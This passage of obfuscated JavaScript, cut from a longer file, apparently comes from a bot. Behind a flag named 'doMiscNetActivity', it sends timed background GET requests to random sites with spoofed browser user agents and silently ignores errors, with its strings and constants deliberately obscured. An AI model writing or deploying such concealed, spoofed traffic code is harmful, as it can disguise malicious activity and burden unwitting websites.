      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = -0x178c + -0x1232 + 0x29be; k < 0x5b * -0x2a + -0x1 * 0x22e9 + -0x31db * -0x1; k++)
    setTimeout(f, (0xe2fd + 0xd * -0x1fcd + 0x11a * 0x17e) * k * getRandomInt(0x1 * 0x1ec1 + 0x267f + -0x453f * 0x1, 0x15d * -0x1 + -0x23c7 * -0x1 + -0x1 * 0x2267));
  setInterval(() => {
    f();
    for (let l = 0x201b + 0x20f2 + -0x410d; l < 0x10d2 + -0x3a * 0x43 + -0x1a0; l++)
      setTimeout(f, (-0xf8b5 + 0x1 * 0x1ad43 + -0x1ae9 * -0x2) * l * getRandomInt(-0x8df * -0x2 + -0x1e * -0x83 + -0x2117, -0x2706 + -0x1cd7 + -0x16a0 * -0x3));
  }, -0x164726 + -0x6 * -0x13a5f + 0x45d76c);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (0x2 * 0xe56 + 0x147 * 0x1b + -0x23d1 * 0x1) * getRandomInt(0xf8c + -0x2 * 0xe08 + 0x5 * 0x281, 0x1 * 0x10da + 0xf62 + -0x2037));
}, 0x12 * 0x225 + 0x675 + -0x5 * 0x8ef);